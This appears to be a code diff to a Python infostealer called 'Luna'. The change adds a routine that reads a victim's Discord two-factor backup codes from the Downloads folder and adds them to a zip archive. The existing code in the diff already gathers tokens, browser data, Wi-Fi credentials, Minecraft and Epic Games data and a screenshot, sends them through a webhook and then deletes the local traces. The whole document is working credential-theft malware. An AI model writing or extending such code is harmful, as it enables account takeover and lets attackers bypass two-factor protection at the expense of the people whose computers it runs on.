@@ -33,7 +33,7 @@ def main(webhook: str):
     get_inf()
     grabtokens()
 
-    threads = [ss, chrome, grabwifi, mc_tokens, epicgames_data]
+    threads = [ss, chrome, grabwifi, mc_tokens, epicgames_data, mfa_codes]
 
     for func in threads:
         process = threading.Thread(target=func, daemon=True)
@@ -500,6 +500,25 @@ class epicgames_data():
             else:
                 g.write("No epic games data was found :(")
 
+@try_extract
+class mfa_codes():
+    def __init__(self):
+        self.path = os.environ["HOMEPATH"]
+        self.code_path = '\\Downloads\\discord_backup_codes.txt'
+
+        self.get_codes()
+
+    def get_codes(self):
+        with open(".\\discord-2fa-codes.txt", "w", encoding="utf-8", errors='ignore') as f:
+            f.write(f"{github} | Discord Backup Codes\n\n")
+            if os.path.exists(self.path + self.code_path):
+                with open(self.path + self.code_path, 'r') as g:
+                    for line in g.readlines():
+                        if line.startswith("*"):
+                            f.write(line)
+            else:
+                f.write("\n No discord backup codes found")
+
 def zipup():
     with ZipFile(f'Luna-Logged-{os.getenv("Username")}.zip', 'w') as zipf:
         try:
@@ -510,6 +529,7 @@ def zipup():
             zipf.write("minecraft-sessioninfo.json")
             zipf.write("minecraft-usercache.json")
             zipf.write("epicgames-data.txt")
+            zipf.write("discord-2fa-codes.txt")
             zipf.write("desktop-screenshot.png")
         except Exception:
             pass
@@ -523,6 +543,7 @@ def cleanup():
         os.remove("minecraft-usercache.json"),
         os.remove("minecraft-sessioninfo.json"),
         os.remove("epicgames-data.txt"),
+        os.remove("discord-2fa-codes.txt"),
         os.remove("desktop-screenshot.png"),
         os.remove(f"Luna-Logged-{os.getenv('Username')}.zip")
     except Exception:
